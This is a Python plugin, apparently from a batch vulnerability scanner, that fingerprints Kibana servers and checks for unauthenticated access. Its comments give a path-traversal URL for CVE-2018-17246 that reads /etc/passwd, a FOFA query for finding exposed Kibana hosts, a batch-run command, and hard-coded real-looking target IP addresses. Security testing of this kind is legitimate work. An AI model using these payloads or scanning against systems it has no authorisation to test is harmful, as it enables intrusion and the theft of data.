# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# can getshell
# CVE-2019-7609
# http://ip:5601/app/timelion

# CVE-2018-17246
# http://ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd

# exec部分不知道什么原因不能利用
# fofa: app="elastic-Kibana" && country="CN"
# python3 batch.py -m exploit.scripts.Unauth.Kibana.unauth -cs -fs "\"elastic-Kibana\""

class Script(BaseScript):
    name = 'Kibana'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UNAUTH
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/app/kibana/']
        # 相关信息
        self.info = '''Kibana存在未授权访问漏洞，攻击者通过访问URL，无需登录即可登录获取信息 配合CVE-2019-7609（5.6.15到6.6.1之间的版本中存在一处原型链污染漏洞，利用这个漏洞我们可以在目标服务器上执行任意JavaScript代码）进行命令执行 Kibana < 6.6.1 Kibana < 5.6.15'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False, allow_redirects=False) as response:
                    await asyncio.sleep(2)
                    if response is not None and response.status == 302 and 'kibana' in response.headers.get('kbn-name', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'kibanaWelcomeView' in text and 'cluster_uuid' in text and 'kibanaWelcomeLogo' in text and 'kibanaWelcomeTitle' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
